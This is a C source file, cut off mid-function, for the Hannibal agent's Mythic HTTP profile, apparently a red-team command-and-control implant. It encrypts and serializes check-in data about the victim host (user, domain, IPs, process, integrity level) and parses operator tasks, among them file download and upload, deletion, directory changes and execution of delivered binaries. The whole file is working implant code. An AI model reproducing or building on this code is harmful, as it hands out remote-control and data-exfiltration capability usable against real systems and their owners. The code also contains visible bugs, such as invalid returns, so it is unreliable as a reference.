/**
 * This file contains the bulk of all logic for the
 * Hannibal Mythic HTTP Profile. 
 * 
 * In an attempt to make it easier to locate agent functionality,
 * it has been kept in a single file. Though it may be bad practice 
 * to have this many lines.
 * 
 * Contained in this file are:
 *  Helper Functions
 *  Serializer Functions
 *  Core Functions
 * 
 * Ctrl+f these to jump to sections.
 */


#include "profile_mythic_http.h"



//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/**
 * Helper Functions
*/

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


/**
 * @brief Encrypts, hashes, encodes, and formats message as Mythic HTTP expects.
 * 
 * The Mythic HTTP encrypted message format is of this form:
 * base64_enc(uuid+IV+AES256_CBC_PADDED(msg)+HMAC_SHA256(IV+AES256_CBC_PADDED(msg)))
 * 
 * This function will generate an IV, encrypt the msg, take a SHA256_HMAC,
 * format the message how it's expected, base64, then return that buffer.
 * 
 * @param[in,out] buffer A pointer to the raw bytes before encryption.
 * @param[in] buffer_size The size of buffer
 * 
 * @return MYTHIC_HTTP_ENCRYPTION_MSG A struct containing the buffer after its been formatted as Mythic expects and its size.
 */
SECTION_CODE MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_encrypt(uint8_t *buffer, int buffer_size)
{
    HANNIBAL_INSTANCE_PTR

    // Generate IV

    uint8_t iv[16];
    generate_iv(iv);

    // Prepare to encrypt buffer

    int data_len = buffer_size;
    int key_len = hannibal_instance_ptr->config.encrypt_key_size;

    // Must be multiples of 16

    int ciphertext_size = data_len;
    if (data_len % 16 == 0) { 
        ciphertext_size += 16; // PKCS#7 requires another block of padding if already a multiple of 16 
    } else {
        ciphertext_size += 16 - (data_len % 16); // Add just enough padding to reach the next multiple
    }

    int key_len_adjusted = key_len;
    if (key_len % 16 == 0) { 
        key_len_adjusted += 16; 
    } else {
        key_len_adjusted += 16 - (key_len % 16); 
    }

    uint8_t *ciphertext = (uint8_t*)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, ciphertext_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if(ciphertext == NULL){
        return;
    }

    uint8_t padded_key[key_len_adjusted];

    pic_RtlSecureZeroMemory(ciphertext, ciphertext_size);
    pic_RtlSecureZeroMemory(padded_key, key_len_adjusted);

    for (int i=0; i < data_len; i++) {
        ciphertext[i] = (uint8_t)buffer[i];
    }
    for (int i=0; i < key_len; i++) {
        padded_key[i] = (uint8_t)hannibal_instance_ptr->config.encrypt_key[i];
    }  

    int buffer_pad = pkcs7_padding_pad_buffer( ciphertext, data_len, ciphertext_size, 16 );
    int key_pad = pkcs7_padding_pad_buffer( padded_key, key_len, sizeof(padded_key), 16 );

    // int valid = pkcs7_padding_valid( ciphertext, data_len, sizeof(ciphertext), 16 );
    // int valid2 = pkcs7_padding_valid( padded_key, key_len, sizeof(padded_key), 16 );

    // Encrypt the buffer

    struct AES_ctx ctx;

    AES_init_ctx_iv(&ctx, padded_key, iv);

    AES_CBC_encrypt_buffer(&ctx, ciphertext, ciphertext_size);


    // HMAC_SHA256(IV+AES256_CBC_PADDED(buffer))

    uint8_t *iv_msg = (uint8_t*)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(iv) + ciphertext_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // char iv_msg[sizeof(iv) + ciphertext_size]; // Large contents exceed stack limits and cause crashes in PIC mode as there's no chkstk
    pic_memcpy(iv_msg, iv, sizeof(iv));
    pic_memcpy(iv_msg + sizeof(iv), ciphertext, ciphertext_size);

    char digest[32];

    crypto_hmac_sha256(padded_key, 32, iv_msg, sizeof(iv) + ciphertext_size, digest, 32);

    hannibal_instance_ptr->Win32.VirtualFree(iv_msg, 0, MEM_RELEASE);

    // Format as Mythic HTTP expects
    int encode_buffer_size = pic_strlen(hannibal_instance_ptr->config.uuid) + sizeof(iv) + ciphertext_size + sizeof(digest);

    // Freed below
    uint8_t *encode_buffer = (uint8_t*)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, encode_buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    pic_memcpy(encode_buffer, hannibal_instance_ptr->config.uuid, pic_strlen(hannibal_instance_ptr->config.uuid));
    pic_memcpy(encode_buffer + pic_strlen(hannibal_instance_ptr->config.uuid), iv, sizeof(iv));
    pic_memcpy(encode_buffer + pic_strlen(hannibal_instance_ptr->config.uuid) + sizeof(iv), ciphertext, ciphertext_size);
    pic_memcpy(encode_buffer + pic_strlen(hannibal_instance_ptr->config.uuid) + sizeof(iv) + ciphertext_size, digest, sizeof(digest));

    hannibal_instance_ptr->Win32.VirtualFree(ciphertext, 0, MEM_RELEASE);
    hannibal_instance_ptr->Win32.VirtualFree(buffer, 0, MEM_RELEASE);

    // Encode to Base64

    // https://stackoverflow.com/questions/13378815/base64-length-calculation ~ bitwise NOT
    // +4 because pic_strlen(b64_encode_out); is sometimes 4 bytes larger than base64_size
    // Unknown why. Possibly b64 padding issues or some other miscalculation. TODO: Handle better.
    size_t base64_size = (((4 * encode_buffer_size + 2) / 3) & ~3) + 4;

    LPVOID b64_encode_out = {0};
    b64_encode_out = hannibal_instance_ptr->Win32.VirtualAlloc(NULL, base64_size, MEM_COMMIT, PAGE_READWRITE); // Freed in calling function
    
    base64_encode(encode_buffer, encode_buffer_size, b64_encode_out);

    int len = pic_strlen(b64_encode_out);

    hannibal_instance_ptr->Win32.VirtualFree(encode_buffer, 0, MEM_RELEASE);


    MYTHIC_HTTP_ENCRYPTION_MSG ret;
    ret.buffer = b64_encode_out;
    ret.buffer_size = len; // Strlen is used because if base64_size ends up being too big the null bytes will cause b64 decode errors.

    return ret;
    
}

/**
 * @brief Decryptes, checks hashes, decodes, and returns raw bytes to be deserialized.
 * 
 * The Mythic HTTP encrypted message format is of this form:
 * base64_enc(uuid+IV+AES256_CBC_PADDED(msg)+HMAC_SHA256(IV+AES256_CBC_PADDED(msg)))
 * 
 * @param[in,out] buffer A pointer to the buffer of base64 from Mythic HTTP
 * @param[in] buffer_size The size of buffer
 * 
 * @return MYTHIC_HTTP_ENCRYPTION_MSG A struct containing the buffer after its been formatted as Mythic expects and its size.
 */
SECTION_CODE MYTHIC_HTTP_ENCRYPTION_MSG mythic_http_aes_decrypt(uint8_t *buffer, int buffer_size)
{
    HANNIBAL_INSTANCE_PTR

    // Calculate size in binary from the B64 string

    size_t binary_size = (buffer_size * 3) / 4;

    if (buffer[buffer_size - 1] == '=') {
        binary_size--;
    }
    if (buffer[buffer_size - 2] == '=') {
        binary_size--;
    }

    // Decode from B64

    // Freed below
    LPVOID b64_decoded_response = hannibal_instance_ptr->Win32.VirtualAlloc(NULL, binary_size, MEM_COMMIT, PAGE_READWRITE);

    pic_RtlSecureZeroMemory(b64_decoded_response, binary_size);

    base64_decode(buffer, buffer_size, b64_decoded_response);

    hannibal_instance_ptr->Win32.VirtualFree(buffer, 0, MEM_RELEASE);

    // Locate each element in the buffer

    int message_size = binary_size - (36 + 16 + 32); // Minus GUID + IV + HMAC

    LPVOID outer_uuid_ptr = b64_decoded_response;
    LPVOID iv_ptr = b64_decoded_response + 36; // GUID 36 bytes
    LPVOID message_ptr = b64_decoded_response + 36 + 16; // GUID 36 bytes, IV 16 bytes
    LPVOID hmac_ptr = b64_decoded_response + 36 + 16 + message_size;

    // Ignore outer UUID

    // IV
    char iv[16];
    for(int i = 0; i < 16; i++){
        iv[i] = ((CHAR*)iv_ptr)[i];
    }

    // HMAC
    char hmac[32]; 
    for(int i = 0; i < 32; i++){
        hmac[i] = ((CHAR*)hmac_ptr)[i];
    }

    // Calcuate the SHA256_HMAC

    int iv_msg_size = sizeof(iv) + message_size;
    uint8_t *iv_msg = (uint8_t*)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(iv) + message_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // char iv_msg[sizeof(iv) + message_size]; // Corrupting stack
    pic_memcpy(iv_msg, iv, sizeof(iv));
    pic_memcpy(iv_msg + sizeof(iv), message_ptr, message_size);

    char digest[32];

    crypto_hmac_sha256(
        hannibal_instance_ptr->config.encrypt_key,
        hannibal_instance_ptr->config.encrypt_key_size, 
        iv_msg, 
        iv_msg_size, 
        digest, sizeof(digest)
    );

    hannibal_instance_ptr->Win32.VirtualFree(iv_msg, 0, MEM_RELEASE);


    int hash_match = MemCompare(hmac, digest, sizeof(digest));

    // If message has not been tampered with or corrupted

    if(hash_match == 0){

        int key_len = hannibal_instance_ptr->config.encrypt_key_size;
        int key_len_adjusted = key_len;
         if (key_len % 16 == 0) { 
            key_len_adjusted += 16; 
        } else {
            key_len_adjusted += 16 - (key_len % 16); 
        }
        uint8_t padded_key[key_len_adjusted];
        for (int i=0; i < key_len; i++) {
            padded_key[i] = (uint8_t)hannibal_instance_ptr->config.encrypt_key[i];
        } 
        int key_pad = pkcs7_padding_pad_buffer( padded_key, key_len, sizeof(padded_key), 16 );


        // Decrypt

        // Freed in calling function
        LPVOID decrypt_buffer = hannibal_instance_ptr->Win32.VirtualAlloc(NULL, message_size, MEM_COMMIT, PAGE_READWRITE);
        pic_memcpy(decrypt_buffer, message_ptr, message_size);
        
        hannibal_instance_ptr->Win32.VirtualFree(b64_decoded_response, 0, MEM_RELEASE);


        struct AES_ctx ctx;
        AES_init_ctx_iv(&ctx, padded_key, iv);
        AES_CBC_decrypt_buffer(&ctx, decrypt_buffer, message_size);

        MYTHIC_HTTP_ENCRYPTION_MSG ret;
        ret.buffer = decrypt_buffer;
        ret.buffer_size = message_size;

        return ret;

    }

    // Hash did not match. Message corrupted or tampered with.
    MYTHIC_HTTP_ENCRYPTION_MSG ret;
    ret.buffer = 0;
    ret.buffer_size = 0;

    return ret;

}







//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/**
 * Serializer Functions for Mythic HTTP Profile
*/

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// Always refer to translator.py to see what it expects and sends.

/**
 * @brief Takes a struct of checkin information and serializes it as translator.py expects.
 * 
 * Need to find a more elegant way to handle this as these serializer
 * functions are a bit verbose.
 * 
 * @param [in] message A struct with the various properties Mythic HTTP can accept in a checkin message
 * @param [in,out] message The size of the serialized buffer.
 * 
 * @return UINT8 Pointer to the serialized buffer.
 */
SECTION_CODE UINT8* serialize_checkin(const CheckinMessage *message, UINT32 *output_size) {
    
    HANNIBAL_INSTANCE_PTR

    // the += 5 is for the TLV Header
    // Type - 1 Byte
    // Length - 4 Bytes
    // Value - Variable Length

    UINT32 total_size = 0;
    UINT8 tlv_size = sizeof(UINT8) + sizeof(UINT32);

    // Required Parameters
    total_size += sizeof(message->action); // There is no TLV for the Message Type
    total_size += tlv_size + (UINT32)pic_strlen(message->uuid);    // UUID TLV + sizeof uuid

    // Optional Parameters
    if (message->ips && message->ips_count > 0) {
        for (UINT32 i = 0; i < message->ips_count; i++) {
            total_size += tlv_size + (UINT32)pic_strlenW(message->ips[i])*sizeof(WCHAR);
        }
    }

    if (message->os)             total_size += tlv_size + (UINT32)pic_strlenW(message->os)*sizeof(WCHAR);
    if (message->user)           total_size += tlv_size + (UINT32)pic_strlenW(message->user)*sizeof(WCHAR);
    if (message->host)           total_size += tlv_size + (UINT32)pic_strlenW(message->host)*sizeof(WCHAR);
    if (message->architecture)   total_size += tlv_size + (UINT32)pic_strlenW(message->architecture)*sizeof(WCHAR);
    if (message->domain)         total_size += tlv_size + (UINT32)pic_strlenW(message->domain)*sizeof(WCHAR);
    if (message->external_ip)    total_size += tlv_size + (UINT32)pic_strlenW(message->external_ip)*sizeof(WCHAR);
    if (message->encryption_key) total_size += tlv_size + (UINT32)pic_strlenW(message->encryption_key)*sizeof(WCHAR);
    if (message->decryption_key) total_size += tlv_size + (UINT32)pic_strlenW(message->decryption_key)*sizeof(WCHAR);
    if (message->process_name)   total_size += tlv_size + (UINT32)pic_strlenW(message->process_name)*sizeof(WCHAR);

    if (message->pid)            total_size += tlv_size + sizeof(message->pid);
    if (message->integrity_level) total_size += tlv_size + sizeof(message->integrity_level);


    // Freed in mythic_http_checkin()
    UINT8 *buffer = (UINT8*)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) return NULL;

    UINT8 *current_position = buffer;

    // Write Required Parameters

    WriteUint8(&current_position, MESSAGE_TYPE_CHECKIN);

    WriteUint8(&current_position, TLV_CHECKIN_UUID);
    WriteUint32(&current_position, (UINT32)pic_strlen(message->uuid));
    WriteString(&current_position, message->uuid, FALSE); // Write string, but do not include the null terminator

    // Write Optional Parameters

    if (message->ips && message->ips_count > 0) {
        for(UINT32 i = 0; i < message->ips_count; i++){
            WriteUint8(&current_position, TLV_CHECKIN_IPS);
            WriteUint32(&current_position, (UINT32)pic_strlenW(message->ips[i])*sizeof(WCHAR));
            WriteStringW(&current_position, message->ips[i], FALSE);
        }
    }

    if (message->os) {
        WriteUint8(&current_position, TLV_CHECKIN_OS);
        WriteUint32(&current_position, (UINT32)pic_strlenW(message->os)*sizeof(WCHAR));
        WriteStringW(&current_position, message->os, FALSE);
    }
    if (message->user) {
        WriteUint8(&current_position, TLV_CHECKIN_USER);
        WriteUint32(&current_position, (UINT32)pic_strlenW(message->user)*sizeof(WCHAR));
        WriteStringW(&current_position, message->user, FALSE);
    }
    if (message->host) {
        WriteUint8(&current_position, TLV_CHECKIN_HOST);
        WriteUint32(&current_position, (UINT32)pic_strlenW(message->host)*sizeof(WCHAR));
        WriteStringW(&current_position, message->host, FALSE);
    }
    if (message->pid) {
        WriteUint8(&current_position, TLV_CHECKIN_PID);
        WriteUint32(&current_position, 4);
        WriteUint32(&current_position, message->pid);
    }
    if (message->architecture) {
        WriteUint8(&current_position, TLV_CHECKIN_ARCHITECTURE);
        WriteUint32(&current_position, (UINT32)pic_strlenW(message->architecture)*sizeof(WCHAR));
        WriteStringW(&current_position, message->architecture, FALSE);
    }
    if (message->domain) {
        WriteUint8(&current_position, TLV_CHECKIN_DOMAIN);
        WriteUint32(&current_position, (UINT32)pic_strlenW(message->domain)*sizeof(WCHAR));
        WriteStringW(&current_position, message->domain, FALSE);
    }
    if (message->integrity_level) {
        WriteUint8(&current_position, TLV_CHECKIN_INTEGRITY_LEVEL);
        WriteUint32(&current_position, 4);
        WriteUint32(&current_position, message->integrity_level);
    }
    if (message->external_ip) {
        WriteUint8(&current_position, TLV_CHECKIN_EXTERNAL_IP);
        WriteUint32(&current_position, (UINT32)pic_strlenW(message->external_ip)*sizeof(WCHAR));
        WriteStringW(&current_position, message->external_ip, FALSE);
    }
    if (message->encryption_key) {
        WriteUint8(&current_position, TLV_CHECKIN_ENCRYPTION_KEY);
        WriteUint32(&current_position, (UINT32)pic_strlenW(message->encryption_key)*sizeof(WCHAR));
        WriteStringW(&current_position, message->encryption_key, FALSE);
    }
    if (message->decryption_key) {
        WriteUint8(&current_position, TLV_CHECKIN_DECRYPTION_KEY);
        WriteUint32(&current_position, (UINT32)pic_strlenW(message->decryption_key)*sizeof(WCHAR));
        WriteStringW(&current_position, message->decryption_key, FALSE);
    }
    if (message->process_name) {
        WriteUint8(&current_position, TLV_CHECKIN_PROCESS_NAME);
        WriteUint32(&current_position, (UINT32)pic_strlenW(message->process_name)*sizeof(WCHAR));
        WriteStringW(&current_position, message->process_name, FALSE);
    }

    *output_size = total_size;
    return buffer;
}

SECTION_CODE CheckinMessageResponse* deserialize_checkin_reponse(UINT8 *buffer)
{

    HANNIBAL_INSTANCE_PTR

    // Type    Status   Type   Length   UUID
    // UINT8 | UINT8 | UINT8 | UINT32 | Value

    UINT8 message_type = ReadUint8(&buffer);  

    if(message_type != MESSAGE_TYPE_CHECKIN_RESPONSE){
        return NULL;
    }

    // Freed in mythic_http_checkin()
    CheckinMessageResponse *message = (CheckinMessageResponse *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CheckinMessageResponse), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!message){
        return NULL;
    } 

    message->status = ReadUint8(&buffer); // status - 1 or 0

    UINT8 type = ReadUint8(&buffer);
    UINT32 length = ReadUint32(&buffer);

    if (type == TLV_CHECKIN_RESPONSE_ID){
        message->uuid = ReadString(&buffer, length);
    }

    return message;
}

SECTION_CODE UINT8* serialize_get_tasking_msg(const GetTasksMessage *message, UINT32 *output_size)
{

    // Type    TSize    Get Delegates
    // UINT8 | UINT8 | UINT8
    
    HANNIBAL_INSTANCE_PTR

    UINT32 total_size = 0;
    total_size += sizeof(message->action);
    total_size += sizeof(message->tasking_size);
    total_size += sizeof(message->get_delegate_tasks);
    
    // Freed in mythic_http_get_tasks()
    UINT8 *buffer = (UINT8*)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    UINT8 *current_position = buffer;

    if(!buffer){
        return NULL;
    }

    WriteUint8(&current_position, message->action);
    WriteUint8(&current_position, message->tasking_size);
    WriteUint8(&current_position, message->get_delegate_tasks);

    *output_size = total_size;
    
    return buffer;

}

/**
 * @brief This function will deserialize the response from Mythic, 
 *        parse each task, and store in the task_queue.
 * 
 * TODO: Split up into another file. Reduce code. It is overly verbose.

 * Note: ReadString and ReadStringW alloc buffers on the heap. These will
 * need freeing. Typically done in the respective command once the command finishes.
 * 
 * @param[in] buffer A buffer containing the serialized information from get_tasks
 * 
 * @return void
 */
SECTION_CODE void deserialize_get_tasks_response(char *buffer)
{
    HANNIBAL_INSTANCE_PTR

    // MSG Type | CMD | CMD TLV
    // UINT8 | UINT8 | UINT8 | UINT32 | Value

    UINT8 message_type = ReadUint8(&buffer);

    if(message_type != MESSAGE_TYPE_GET_TASKS_RESPONSE){
        return NULL;
    }

    UINT8 task_count = ReadUint8(&buffer);

    for (int i = 0; i < task_count; i++){

        TASK task;

        // Get around cross initialization errors.
        // Originally had else ifs but made the #ifdefs annoying to use.
        UINT8 tlv_type = 0;
        LPCSTR param1_string = 0;
        LPCWSTR param1_wstring = 0;
        LPCWSTR param2_wstring = 0;
        UINT32 param1_uint32 = 0;
        UINT32 param2_uint32 = 0;

        LPVOID param1_lpvoid;
        LPVOID param2_lpvoid;

#ifdef INCLUDE_CMD_LS
        CMD_LS *ls;
#endif

#ifdef INCLUDE_CMD_EXIT
        CMD_EXIT *exit_cmd;
#endif

#ifdef INCLUDE_CMD_EXECUTE_HBIN
        CMD_EXECUTE_HBIN *eh;
#endif

#ifdef INCLUDE_CMD_RM
        CMD_RM *rm;
#endif

#ifdef INCLUDE_CMD_DOWNLOAD
        FILE_DOWNLOAD *fd;
#endif

#ifdef INCLUDE_CMD_UPLOAD
        FILE_UPLOAD *fu;
#endif

#ifdef INCLUDE_CMD_PWD
        CMD_PWD *pwd;
#endif

#ifdef INCLUDE_CMD_CD
        CMD_CD *cd;
#endif

#ifdef INCLUDE_CMD_CP
        CMD_CP *cp;
#endif

#ifdef INCLUDE_CMD_MV
        CMD_MV *mv;
#endif

#ifdef INCLUDE_CMD_HOSTNAME
        CMD_HOSTNAME *hostname;
#endif

#ifdef INCLUDE_CMD_WHOAMI
        CMD_WHOAMI *who;
#endif

#ifdef INCLUDE_CMD_MKDIR
        CMD_MKDIR *mk;
#endif

#ifdef INCLUDE_CMD_PS
        CMD_PS *ps;
#endif

#ifdef INCLUDE_CMD_IPINFO
        CMD_IPINFO *ip;
#endif

#ifdef INCLUDE_CMD_LISTDRIVES
        CMD_LISTDRIVES *ld;
#endif

#ifdef INCLUDE_CMD_EXECUTE
        CMD_EXECUTE *exec;
#endif

#ifdef INCLUDE_CMD_SLEEP
        CMD_SLEEP *sleep;
#endif

#ifdef INCLUDE_CMD_AGENTINFO
        CMD_AGENTINFO *info;
#endif

        UINT8 cmd = ReadUint8(&buffer);

        switch(cmd)
        {
#ifdef INCLUDE_CMD_LS
            case CMD_LS_MESSAGE:
                tlv_type = ReadUint8(&buffer);

                if(tlv_type == TLV_CMD_ID){
                    UINT32 id_len = ReadUint32(&buffer);
                    task.task_uuid = ReadString(&buffer, id_len); // Freed in mythic_http_post_tasks()
                }

                task.cmd_id = CMD_LS_MESSAGE;

                task.cmd = (CMD_LS *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_LS), MEM_COMMIT, PAGE_READWRITE); // Freed in cmd_ls()
                if(!task.cmd){
                    return NULL;
                }

                tlv_type = ReadUint8(&buffer);

                if (tlv_type == TLV_CMD_LS_PARAM_PATH) {
                    param1_uint32 = ReadUint32(&buffer);
                    param1_wstring = ReadStringW(&buffer, param1_uint32); // Freed in cmd_ls()
                }

                ls = (CMD_LS *)task.cmd;
                ls->path = param1_wstring;
                task.cmd = ls;
                
                task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

                break;
#endif // INCLUDE_CMD_LS
#ifdef INCLUDE_CMD_EXIT
            case CMD_EXIT_MESSAGE:
                
                tlv_type = ReadUint8(&buffer);

                if(tlv_type == TLV_CMD_ID){
                    param1_uint32 = ReadUint32(&buffer);
                    task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in mythic_http_post_tasks()
                }

                task.cmd_id = CMD_EXIT_MESSAGE;

                task.cmd = (CMD_EXIT *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_EXIT), MEM_COMMIT, PAGE_READWRITE);
                if(!task.cmd){
                    return NULL;
                }

                param1_uint32 = ReadUint32(&buffer); // Not used
                
                exit_cmd = (CMD_EXIT *)task.cmd;
                exit_cmd->type = ReadUint8(&buffer);

                task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

                break;
#endif // INCLUDE_CMD_EXIT
#ifdef INCLUDE_CMD_DOWNLOAD
            case CMD_DOWNLOAD_MESSAGE:
                
                tlv_type = ReadUint8(&buffer);

                if(tlv_type == TLV_CMD_ID){
                    param1_uint32 = ReadUint32(&buffer);
                    task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in mythic_http_continue_file_downloads()
                }

                tlv_type = ReadUint8(&buffer);

                if (tlv_type == TLV_DOWNLOAD_PARAM_PATH) {
                    param1_uint32 = ReadUint32(&buffer);
                    param1_wstring = ReadStringW(&buffer, param1_uint32); // Freed in mythic_http_continue_file_downloads()
                }

                // Freed in mythic_http_start_file_download()
                fd = (FILE_DOWNLOAD *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(FILE_DOWNLOAD), MEM_COMMIT, PAGE_READWRITE);
                fd->path = param1_wstring;
                fd->bytes_sent = 0;
                fd->download_uuid = 0;
                fd->task_uuid = task.task_uuid;

                mythic_http_start_file_download(fd);

                break;
#endif // INCLUDE_CMD_DOWNLOAD
#ifdef INCLUDE_CMD_UPLOAD
            case CMD_UPLOAD_MESSAGE:

                tlv_type = ReadUint8(&buffer);

                if(tlv_type == TLV_CMD_ID){
                    param1_uint32 = ReadUint32(&buffer);
                    task.task_uuid = ReadString(&buffer, param1_uint32);
                }

                tlv_type = ReadUint8(&buffer);

                if(tlv_type == TLV_UPLOAD_FILE_UUID){
                    param1_uint32 = ReadUint32(&buffer);
                    param1_string = ReadString(&buffer, param1_uint32);
                }

                tlv_type = ReadUint8(&buffer);

                if(tlv_type == TLV_UPLOAD_REMOTE_PATH){
                    param1_uint32 = ReadUint32(&buffer);
                    param1_wstring = ReadStringW(&buffer, param1_uint32);
                }

                // Freed in mythic_http_start_file_upload()
                fu = (FILE_UPLOAD *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(FILE_UPLOAD), MEM_COMMIT, PAGE_READWRITE);
                fu->path = param1_wstring;
                fu->bytes_received = 0;
                fu->chunk_count = 0;
                fu->chunks_received = 0;
                fu->filesize = 0;
                fu->task_uuid = task.task_uuid;
                fu->upload_uuid = param1_string;

                mythic_http_start_file_upload(fu);

                break;
#endif // INCLUDE_CMD_UPLOAD
#ifdef INCLUDE_CMD_EXECUTE_HBIN
        case CMD_EXECUTE_HBIN_MESSAGE:
            
            tlv_type = ReadUint8(&buffer);

             if(tlv_type == TLV_CMD_ID){
                param1_uint32 = ReadUint32(&buffer);
                task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
            }

            tlv_type = ReadUint8(&buffer);
            
            if(tlv_type == TLV_CMD_EXECUTE_HBIN_ARGS){
                param1_uint32 = ReadUint32(&buffer); // Arg size
                param1_lpvoid = ReadBytes(&buffer, param1_uint32);
            }

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_EXECUTE_HBIN_BIN){
                param2_uint32 = ReadUint32(&buffer);
                param2_lpvoid = ReadBytes(&buffer, param2_uint32);
            }

            task.cmd_id = CMD_EXECUTE_HBIN_MESSAGE;

            task.cmd = (CMD_EXECUTE_HBIN *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_EXECUTE_HBIN), MEM_COMMIT, PAGE_READWRITE);
            if(!task.cmd){
                return NULL;
            }

            eh = (CMD_EXECUTE_HBIN *)task.cmd;
            eh->args = param1_lpvoid; 
            eh->arg_size = param1_uint32;
            eh->hbin = param2_lpvoid;
            eh->hbin_size = param2_uint32;

            task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

            break;
#endif // INCLUDE_CMD_EXECUTE_HBIN
#ifdef INCLUDE_CMD_RM
        case CMD_RM_MESSAGE:
           
            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_ID){
                param1_uint32 = ReadUint32(&buffer);
                task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
            }

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_RM_PATH){
                param1_uint32 = ReadUint32(&buffer);
                param1_wstring = ReadStringW(&buffer, param1_uint32);
            }

            task.cmd_id = CMD_RM_MESSAGE;

            task.cmd = (CMD_RM *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_RM), MEM_COMMIT, PAGE_READWRITE);
            if(!task.cmd){
                return NULL;
            }

            rm = (CMD_RM *)task.cmd;
            rm->path = param1_wstring;
            task.cmd = rm;

            task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

            break;
#endif // INCLUDE_CMD_RM
#ifdef INCLUDE_CMD_PWD
        case CMD_PWD_MESSAGE:

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_ID){
                param1_uint32 = ReadUint32(&buffer);
                task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
            }

            task.cmd_id = CMD_PWD_MESSAGE;

            task.cmd = (CMD_PWD *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_PWD), MEM_COMMIT, PAGE_READWRITE);
            if(!task.cmd){
                return NULL;
            }

            pwd = (CMD_PWD *)task.cmd;
            task.cmd = pwd;

            task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

            break;
#endif // INCLUDE_CMD_PWD
#ifdef INCLUDE_CMD_CD
        case CMD_CD_MESSAGE:

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_ID){
                param1_uint32 = ReadUint32(&buffer);
                task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
            }

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_CD_PATH){
                param1_uint32 = ReadUint32(&buffer);
                param1_wstring = ReadStringW(&buffer, param1_uint32);
            }

            task.cmd_id = CMD_CD_MESSAGE;

            task.cmd = (CMD_CD *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_CD), MEM_COMMIT, PAGE_READWRITE);
            if(!task.cmd){
                return NULL;
            }

            cd = (CMD_CD *)task.cmd;
            cd->path = param1_wstring;
            task.cmd = cd;

            task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

            break;
#endif
#ifdef INCLUDE_CMD_CP
        case CMD_CP_MESSAGE:

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_ID){
                param1_uint32 = ReadUint32(&buffer);
                task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
            }

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_CP_SRC_PATH){
                param1_uint32 = ReadUint32(&buffer);
                param1_wstring = ReadStringW(&buffer, param1_uint32);
            }

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_CP_DST_PATH){
                param2_uint32 = ReadUint32(&buffer);
                param2_wstring = ReadStringW(&buffer, param2_uint32);
            }

            task.cmd_id = CMD_CP_MESSAGE;

            task.cmd = (CMD_CP *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_CP), MEM_COMMIT, PAGE_READWRITE);
            if(!task.cmd){
                return NULL;
            }

            cp = (CMD_CP *)task.cmd;
            cp->src_path = param1_wstring;
            cp->dst_path = param2_wstring;
            task.cmd = cp;

            task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);

            break;
#endif // INCLUDE_CMD_CP
#ifdef INCLUDE_CMD_MV
        case CMD_MV_MESSAGE:

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_ID){
                param1_uint32 = ReadUint32(&buffer);
                task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
            }

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_MV_SRC_PATH){
                param1_uint32 = ReadUint32(&buffer);
                param1_wstring = ReadStringW(&buffer, param1_uint32);
            }

            tlv_type = ReadUint8(&buffer);

            if(tlv_type == TLV_CMD_MV_DST_PATH){
